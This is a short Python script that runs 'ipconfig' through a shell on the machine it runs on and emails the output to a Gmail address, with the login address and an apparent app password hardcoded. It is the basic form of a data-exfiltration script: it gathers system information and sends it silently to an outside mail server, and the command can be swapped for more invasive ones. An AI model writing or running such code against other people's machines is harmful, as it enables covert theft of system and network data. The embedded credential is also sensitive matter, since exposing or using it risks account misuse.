#!/usr/bin/python3
import smtplib
import subprocess

def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
command = 'ipconfig'
result = subprocess.check_output(command, shell=True)
send_mail('xyz@gmail.com', 'hdoizxbpliyomjga', result)
